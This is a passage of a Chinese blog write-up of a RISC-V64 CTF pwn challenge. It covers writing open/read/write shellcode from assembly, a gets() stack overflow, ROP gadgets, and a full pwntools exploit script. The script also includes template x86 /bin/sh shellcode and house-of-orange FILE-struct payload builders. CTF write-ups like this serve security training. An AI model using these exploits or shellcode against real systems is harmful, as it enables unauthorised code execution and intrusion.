<p>将文件夹名字改成riscv64，打开长这样：</p>
<p><img src="/blog_img/image-20210203223724761.png" alt="image-20210203223724761"></p>
<p>交叉编译链都在bin目录下，下面继续分析这个程序：</p>
<p>在做逆向时已经把程序逻辑搞清楚了，其实这题就是在利用gets进行栈溢出的操作，然后通过ghidra9.2的分析：</p>
<p><img src="/blog_img/image-20210203224330694.png" alt="image-20210203224330694"></p>
<p>我们已经知道栈大小为0x120，这里调试用gef进行，因为这题开了沙箱，只能orw打印flag，所以我们需要做的是先找到放置参数的gadget，调用gets函数读取shellcode，然后跳转到shellcode的位置，这里先研究下shellcode怎么写，对于一种新的架构语言，写系统调用都是比较头疼的问题，这里总结一下方法：</p>
<p>1、用交叉编译链静态编译生成含有orw或者execve函数的程序</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">	<span class="keyword">int</span> a = <span class="built_in">open</span>(<span class="string">"./flag"</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="built_in">read</span>(a,buf,<span class="number">100</span>);</span><br><span class="line">	<span class="built_in">write</span>(<span class="number">1</span>,buf,<span class="number">100</span>);</span><br><span class="line">	execve(<span class="string">"/bin/sh"</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./riscv64-unknown-elf-gcc -static -o 1 1.c</span><br></pre></td></tr></table></figure>

<p>ghidra9.2分析汇编：</p>
<p><img src="/blog_img/image-20210203230002120.png" alt="image-20210203230002120"></p>
<p><img src="/blog_img/image-20210203230053767.png" alt="image-20210203230053767"></p>
<p><img src="/blog_img/image-20210203230142217.png" alt="image-20210203230142217"></p>
<p><img src="/blog_img/image-20210203230201162.png" alt="image-20210203230201162"></p>
<p>可以知道的信息就是li是将参数放到寄存器的操作，然后a0，a1，a2是函数调用的前3个参数寄存器，a7是系统调用号放置的寄存器，orw对应是0x400，0x3f，0x40，而execve好像没有系统调用号(奇奇怪怪的~)</p>
<p><img src="/blog_img/image-20210203230555307.png" alt="image-20210203230555307"></p>
<p>下面我们需要做的就是书写汇编然后编译成程序来提取shellcode</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.global _start</span><br><span class="line">    .<span class="built_in">text</span></span><br><span class="line">_start:</span><br><span class="line">        lui a1, <span class="number">0x6d10</span></span><br><span class="line">        srli a1, a1, <span class="number">8</span></span><br><span class="line">        li a0, <span class="number">-100</span></span><br><span class="line">        li a2, <span class="number">0</span></span><br><span class="line">        li a3, <span class="number">0</span></span><br><span class="line">        li a7, <span class="number">0x38</span></span><br><span class="line">        ecall</span><br><span class="line">        lui a1, <span class="number">0x6d10</span></span><br><span class="line">        srli a1, a1, <span class="number">8</span></span><br><span class="line">        li a2, <span class="number">0x100</span></span><br><span class="line">        li a7, <span class="number">0x3f</span></span><br><span class="line">        ecall</span><br><span class="line">        li a0, <span class="number">1</span></span><br><span class="line">        lui a1, <span class="number">0x6d10</span></span><br><span class="line">        srli a1, a1, <span class="number">8</span></span><br><span class="line">        li a2, <span class="number">0x100</span></span><br><span class="line">        li a7, <span class="number">0x40</span></span><br><span class="line">        ecall</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./riscv64-unknown-elf-gcc -c 1.s -o 1</span><br></pre></td></tr></table></figure>

<p><img src="/blog_img/image-20210203231439869.png" alt="image-20210203231439869"></p>
<p>C一下转成数据，cd操作依然有效：</p>
<p><img src="/blog_img/image-20210203231651439.png" alt="image-20210203231651439"></p>
<p>shellcode成功提取出来：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">shellcode_int = [</span><br><span class="line">    <span class="number">0xB7</span>, <span class="number">0x05</span>, <span class="number">0xD1</span>, <span class="number">0x06</span>, <span class="number">0xA1</span>, <span class="number">0x81</span>, <span class="number">0x13</span>, <span class="number">0x05</span>, <span class="number">0xC0</span>, <span class="number">0xF9</span>, <span class="number">0x01</span>, <span class="number">0x46</span>, <span class="number">0x81</span>, <span class="number">0x46</span>, <span class="number">0x93</span>, <span class="number">0x08</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x03</span>, <span class="number">0x73</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xB7</span>, <span class="number">0x05</span>, <span class="number">0xD1</span>, <span class="number">0x06</span>, <span class="number">0xA1</span>, <span class="number">0x81</span>, <span class="number">0x13</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x10</span>,</span><br><span class="line">    <span class="number">0x93</span>, <span class="number">0x08</span>, <span class="number">0xF0</span>, <span class="number">0x03</span>, <span class="number">0x73</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x45</span>, <span class="number">0xB7</span>, <span class="number">0x05</span>, <span class="number">0xD1</span>, <span class="number">0x06</span>, <span class="number">0xA1</span>, <span class="number">0x81</span>,</span><br><span class="line">    <span class="number">0x13</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x93</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x73</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>现在我们只要调用一下gets读取shellcode然后跳转过去即可，这里需要先找下gadget，找到rop控制a0的指令,在0x11b12处，同时读入函数在0x16a5a（应该是gets)处，如果直接返回到gets，那会进入gets无限循环，我们可以控制到0x16a68的位置，只需要多控制s1指向stdin结构体，就不会因为lr寄存器无限循环了，最后跳转到shellcode的位置去执行：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">bin_elf = <span class="string">'./main'</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">"r"</span>:</span><br><span class="line">    p = remote(<span class="string">"106.75.126.171"</span>,<span class="number">33865</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">"l"</span>:</span><br><span class="line">    p = process([<span class="string">"qemu-riscv64"</span>,bin_elf])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process([<span class="string">"qemu-riscv64"</span>, <span class="string">"-g"</span>, <span class="string">"1234"</span>,bin_elf])</span><br><span class="line"></span><br><span class="line"><span class="comment">#onegadget64(libc.so.6)</span></span><br><span class="line"><span class="comment">#more onegadget</span></span><br><span class="line"><span class="comment">#one_gadget -l 200 /lib/x86_64-linux-gnu/libc.so.6</span></span><br><span class="line">one64 = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line"><span class="comment"># [rax == NULL;[rsp+0x30] == NULL,[rsp+0x50] == NULL,[rsp+0x70] == NULL]</span></span><br><span class="line"><span class="comment">#onegadget32(libc.so.6) </span></span><br><span class="line"><span class="comment"># one32 = [0x3ac5c,0x3ac5e,0x3ac62,0x3ac69,0x5fbc5,0x5fbc6]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># py32 = fmtstr_payload(start_read_offset,&#123;xxx_got:system_addr&#125;)</span></span><br><span class="line"><span class="comment"># sl(py32)</span></span><br><span class="line"><span class="comment"># py64 = FormatStr(isx64=1)</span></span><br><span class="line"><span class="comment"># py64[printf_got] = onegadget</span></span><br><span class="line"><span class="comment"># sl(py64.payload(start_read_offset))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh())</span></span><br><span class="line">shellcode32 = <span class="string">'\x68\x01\x01\x01\x01\x81\x34\x24\x2e\x72\x69\x01\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x6a\x0b\x58\xcd\x80'</span> </span><br><span class="line">shellcode64 = <span class="string">'\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x63\x68\x6f\x2e\x72\x69\x01\x48\x31\x04\x24\x48\x89\xe7\x31\xd2\x31\xf6\x6a\x3b\x58\x0f\x05'</span></span><br><span class="line"><span class="comment">#shellcode64 = '\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_file</span><span class="params">(_flags = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_ptr = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_ptr = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_buf_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_buf_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_save_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_backup_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_save_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_marker = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_chain = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _fileno = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _lock = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _wide_data = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _mode = <span class="number">0</span>)</span>:</span></span><br><span class="line">    file_struct = p32(_flags) + \</span><br><span class="line">             p32(<span class="number">0</span>) + \</span><br><span class="line">             p64(_IO_read_ptr) + \</span><br><span class="line">             p64(_IO_read_end) + \</span><br><span class="line">             p64(_IO_read_base) + \</span><br><span class="line">             p64(_IO_write_base) + \</span><br><span class="line">             p64(_IO_write_ptr) + \</span><br><span class="line">             p64(_IO_write_end) + \</span><br><span class="line">             p64(_IO_buf_base) + \</span><br><span class="line">             p64(_IO_buf_end) + \</span><br><span class="line">             p64(_IO_save_base) + \</span><br><span class="line">             p64(_IO_backup_base) + \</span><br><span class="line">             p64(_IO_save_end) + \</span><br><span class="line">             p64(_IO_marker) + \</span><br><span class="line">             p64(_IO_chain) + \</span><br><span class="line">             p32(_fileno)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0x88</span>, <span class="string">"\x00"</span>)</span><br><span class="line">    file_struct += p64(_lock)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0xa0</span>, <span class="string">"\x00"</span>)</span><br><span class="line">    file_struct += p64(_wide_data)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0xc0</span>, <span class="string">'\x00'</span>)</span><br><span class="line">    file_struct += p64(_mode)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0xd8</span>, <span class="string">"\x00"</span>)</span><br><span class="line">    <span class="keyword">return</span> file_struct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_file_flush_str_jumps</span><span class="params">(_IO_str_jumps_addr, _IO_list_all_ptr, system_addr, binsh_addr)</span>:</span></span><br><span class="line">    payload = pack_file(_flags = <span class="number">0</span>,</span><br><span class="line">                        _IO_read_ptr = <span class="number">0x61</span>, <span class="comment">#smallbin4file_size</span></span><br><span class="line">                        _IO_read_base = _IO_list_all_ptr<span class="number">-0x10</span>, <span class="comment"># unsorted bin attack _IO_list_all_ptr,</span></span><br><span class="line">                        _IO_write_base = <span class="number">0</span>,</span><br><span class="line">                        _IO_write_ptr = <span class="number">1</span>,</span><br><span class="line">                        _IO_buf_base = binsh_addr,</span><br><span class="line">                        _mode = <span class="number">0</span>,</span><br><span class="line">                       )</span><br><span class="line">    payload += p64(_IO_str_jumps_addr<span class="number">-8</span>)  <span class="comment"># vtable</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) <span class="comment"># paddding</span></span><br><span class="line">    payload += p64(system_addr)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_io_str_jumps_offset</span><span class="params">(libc)</span>:</span></span><br><span class="line">    IO_file_jumps_offset = libc.sym[<span class="string">'_IO_file_jumps'</span>]</span><br><span class="line">    IO_str_underflow_offset = libc.sym[<span class="string">'_IO_str_underflow'</span>]</span><br><span class="line">    <span class="keyword">for</span> ref_offset <span class="keyword">in</span> libc.search(p64(IO_str_underflow_offset)):</span><br><span class="line">        possible_IO_str_jumps_offset = ref_offset - <span class="number">0x20</span></span><br><span class="line">        <span class="keyword">if</span> possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:</span><br><span class="line">            <span class="comment"># print possible_IO_str_jumps_offset</span></span><br><span class="line">            <span class="keyword">return</span> possible_IO_str_jumps_offset</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">house_of_orange_payload</span><span class="params">(libc, libc_base)</span>:</span></span><br><span class="line">  io_str_jump = libc_base + get_io_str_jumps_offset(libc)</span><br><span class="line">  io_list_all = libc_base + libc.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">  system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">  bin_sh = libc_base + next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line">  payload = pack_file_flush_str_jumps(io_str_jump, io_list_all, system, bin_sh)</span><br><span class="line">  <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : p.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ms</span><span class="params">(name,addr)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> name + <span class="string">"----&gt;"</span> + hex(addr)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(mallocr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print &#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+mallocr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(mallocr)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># with open('1.txt','wb+') as f:</span></span><br><span class="line"><span class="comment">#     s = ""</span></span><br><span class="line"><span class="comment">#     for i in shellcode:</span></span><br><span class="line"><span class="comment">#         s += "0x" + i.encode("hex")</span></span><br><span class="line"><span class="comment">#     for i in s:</span></span><br><span class="line"><span class="comment">#         f.write(i)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># def mid_overflow(offset,func_got,rdi,rsi,rdx,next_func):</span></span><br><span class="line"><span class="comment"># 	payload = ''</span></span><br><span class="line"><span class="comment"># 	payload += 'a'*offset</span></span><br><span class="line"><span class="comment">#   payload += 'aaaaaaaa'</span></span><br><span class="line"><span class="comment"># 	payload += p64(pppppp_ret)</span></span><br><span class="line"><span class="comment"># 	payload += p64(0)</span></span><br><span class="line"><span class="comment"># 	payload += p64(0)</span></span><br><span class="line"><span class="comment"># 	payload += p64(1)</span></span><br><span class="line"><span class="comment"># 	payload += p64(func_got)</span></span><br><span class="line"><span class="comment"># 	payload += p64(rdx)</span></span><br><span class="line"><span class="comment"># 	payload += p64(rsi)</span></span><br><span class="line"><span class="comment"># 	payload += p64(rdi)</span></span><br><span class="line"><span class="comment"># 	payload += p64(mov_ret)</span></span><br><span class="line"><span class="comment"># 	payload += p64(0)</span></span><br><span class="line"><span class="comment"># 	payload += p64(0)</span></span><br><span class="line"><span class="comment"># 	payload += p64(0)</span></span><br><span class="line"><span class="comment"># 	payload += p64(0)</span></span><br><span class="line"><span class="comment"># 	payload += p64(0)</span></span><br><span class="line"><span class="comment"># 	payload += p64(0)</span></span><br><span class="line"><span class="comment"># 	payload += p64(0)</span></span><br><span class="line"><span class="comment"># 	payload += p64(next_func)</span></span><br><span class="line"><span class="comment"># 	ru('Input:\n')</span></span><br><span class="line"><span class="comment"># 	sd(payload)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    ru(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru()</span><br><span class="line">    sl(str(size))</span><br><span class="line">    ru()</span><br><span class="line">    sd(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    ru(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru()</span><br><span class="line">    sl(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">    ru(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru()</span><br><span class="line">    sl(str(index))</span><br><span class="line">    ru()</span><br><span class="line">    sd(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    ru(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line">    ru()</span><br><span class="line">    sl(str(index))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">"Input the flag: "</span>)</span><br><span class="line">payload = <span class="number">0x120</span> * <span class="string">'\x00'</span> + p64(<span class="number">0x11b12</span>) + p64(<span class="number">0x6d000</span>) * <span class="number">5</span> + p64(<span class="number">0x11b12</span>) + p64(<span class="number">0x6d4a0</span>) * <span class="number">5</span> + p64(<span class="number">0x16a68</span>) + p64(<span class="number">0x6d000</span>) * <span class="number">0x50</span></span><br><span class="line">sl(payload)</span><br><span class="line">pause()</span><br><span class="line">shellcode_int = [</span><br><span class="line">    <span class="number">0xB7</span>, <span class="number">0x05</span>, <span class="number">0xD1</span>, <span class="number">0x06</span>, <span class="number">0xA1</span>, <span class="number">0x81</span>, <span class="number">0x13</span>, <span class="number">0x05</span>, <span class="number">0xC0</span>, <span class="number">0xF9</span>, <span class="number">0x01</span>, <span class="number">0x46</span>, <span class="number">0x81</span>, <span class="number">0x46</span>, <span class="number">0x93</span>, <span class="number">0x08</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x03</span>, <span class="number">0x73</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xB7</span>, <span class="number">0x05</span>, <span class="number">0xD1</span>, <span class="number">0x06</span>, <span class="number">0xA1</span>, <span class="number">0x81</span>, <span class="number">0x13</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x10</span>,</span><br><span class="line">    <span class="number">0x93</span>, <span class="number">0x08</span>, <span class="number">0xF0</span>, <span class="number">0x03</span>, <span class="number">0x73</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x45</span>, <span class="number">0xB7</span>, <span class="number">0x05</span>, <span class="number">0xD1</span>, <span class="number">0x06</span>, <span class="number">0xA1</span>, <span class="number">0x81</span>,</span><br><span class="line">    <span class="number">0x13</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x93</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x73</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">]</span><br><span class="line">shellcode = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> shellcode_int:</span><br><span class="line">    shellcode += chr(i)</span><br><span class="line">sl(shellcode.ljust(<span class="number">0x100</span>, <span class="string">'\x00'</span>) + <span class="string">'./flag'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc_base = u64(rc(6).ljust(8,'\x00'))</span></span><br><span class="line"><span class="comment">#print "libc_base----&gt;" + hex(libc_base)</span></span><br><span class="line"><span class="comment">#malloc_hook = libc_base + libc.sym["__malloc_hook"]</span></span><br><span class="line"><span class="comment">#fake_chunk = malloc_hook - 0x23</span></span><br><span class="line"><span class="comment">#realloc = libc_base + libc.sym["realloc"]</span></span><br><span class="line"><span class="comment">#free_hook = libc_base + 